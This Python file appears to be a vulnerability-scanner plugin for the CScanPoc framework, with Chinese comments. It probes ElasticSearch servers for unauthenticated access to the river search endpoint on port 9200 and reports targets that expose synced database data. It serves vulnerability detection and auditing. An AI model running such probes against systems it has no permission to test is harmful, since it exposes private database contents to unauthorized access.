# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0005'  # 平台漏洞编号，留空
    name = 'ElasticSearch 未授权访问漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-05-14'  # 漏洞公布时间
    desc = '''
        ElasticSearch在安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。
    '''  # 漏洞描述
    ref = 'https://www.cnblogs.com/xiaozi/p/8275201.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = 'ElasticSearch'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e87b4bb-9e9d-4319-a252-53b461ece8e9'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target = urllib.parse.urlparse(self.target)
            verify_url = '%s://%s:9200/_river/_search' % (
                target.scheme, target.netloc)

            req = requests.get(verify_url)
            if req.status_code == 200 and '_river' in req.text and 'type' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
